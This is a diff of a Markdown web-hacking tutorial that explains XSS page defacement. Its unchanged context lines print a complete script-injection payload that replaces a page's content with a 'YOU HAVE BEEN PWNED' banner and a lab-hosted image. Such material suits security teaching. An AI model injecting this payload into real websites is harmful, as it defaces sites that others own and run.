@@ -23,12 +23,12 @@ We can utilize injected JavaScript code (through XSS) to make a web page look an
 ```html
 <center><h1 style="color: white">YOU HAVE BEEN PWNED</h1><body style="background-color:#171717"><p style="color: white"><img src="IMGURL" height="400px"></p><h2>XSS DEFACING</h2><h3>by TBHD </h3></center>
 ```
-- The last step is to _add the minified HTML code to our previous XSS payload_ following the pattern `<script>document.body.style.background='HTML'</script>` = `<>PAYLOAD='HTML'<>`.</br>
+- The last step is to _add the minified HTML code to our previous XSS payload_, switching the parametter in our payload for our html line, the pattern must be as follows: `<script>document.body.style.background='HTML'</script>` = `<>PAYLOAD='HTML'<>`.</br>
 __The final payload should be as follows:__
 ```html
 <script>document.body.style.background='<center><h1 style="color: white">YOU HAVE BEEN PWNED</h1><body style="background-color:#171717"><p style="color: white"><img src="http://192.168.1.54/skull.jpg" height="400px"></p><h2>XSS DEFACING</h2><h3>by TBHD </h3></center>'</script>
 ```
-__XSS DEFACING FINAL RESULT__
+__XSS DEFACING FINAL RESULT__</br>
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/138ab5c6-9d62-4038-9c67-442ba4040264" width="450">
 
 
